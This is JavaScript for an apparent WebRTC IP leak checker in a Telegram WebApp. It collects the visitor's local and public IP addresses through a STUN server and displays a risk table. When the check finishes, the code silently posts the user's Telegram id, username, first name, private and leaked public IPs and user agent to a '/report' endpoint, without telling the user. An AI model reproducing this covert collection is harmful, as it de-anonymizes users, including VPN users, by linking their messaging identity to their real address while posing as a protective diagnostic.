function isPrivateIP(ip) {
  return /^10\.|^192\.168\.|^172\.(1[6-9]|2\d|3[0-1])\./.test(ip);
}

function getUserAgent() {
  return navigator.userAgent;
}

function sendLeakData(data) {
  fetch('/report', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  });
}

function detectWebRTC(tgid, username, account) {
  const pc = new RTCPeerConnection({
    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
  });

  const ips = new Set();
  const candText = document.getElementById('candText');
  const sdpText = document.getElementById('sdpText');
  const summaryBody = document.getElementById('summaryBody');

  let privateIP = null;
  let leakedIP = null;

  document.getElementById('status').textContent = "Running...";
  document.getElementById('status').classList.replace('waiting', 'running');

  pc.createDataChannel('test');
  pc.createOffer().then(offer => pc.setLocalDescription(offer));

  pc.onicecandidate = event => {
    if (event.candidate) {
      const c = event.candidate;
      const parts = c.candidate.split(' ');
      const ip = parts[4];
      const type = parts[7];
      const protocol = parts[2];

      if (!ip || ip.endsWith('.local') || ips.has(ip)) return;
      ips.add(ip);

      const scope = isPrivateIP(ip) ? 'Private' : 'Public';
      const risk = (type === 'srflx' || scope === 'Public') ? 'High' : 'Low';
      const riskClass = risk === 'High' ? 'risk-high' : 'risk-low';

      const row = `<tr><td>${ips.size}</td><td>${type}</td><td>${scope}</td><td class="${riskClass}">${risk}</td></tr>`;
      summaryBody.innerHTML += row;

      if (risk === 'High') leakedIP = ip;
      else if (!privateIP) privateIP = ip;

    } else {
      document.getElementById('status').textContent = "Done";
      document.getElementById('status').classList.replace('running', 'done');
      document.getElementById('summarySection').classList.remove('hidden');
      document.getElementById('detailsSection').classList.remove('hidden');
      sdpText.textContent = pc.localDescription.sdp;
      candText.textContent = Array.from(ips).join('\n');

      const tg = window.Telegram?.WebApp?.initDataUnsafe;
      sendLeakData({
        tgid: tg?.user?.id,
        username: tg?.user?.username,
        account: tg?.user?.first_name,
        ip: privateIP || '',
        leaked_ip: leakedIP || '',
        user_agent: getUserAgent()
      });

      if (leakedIP) {
        alert("⚠️ WebRTC IP Leak Detected: " + leakedIP);
      }
    }
  };
}

document.getElementById('startBtn').addEventListener('click', detectWebRTC);
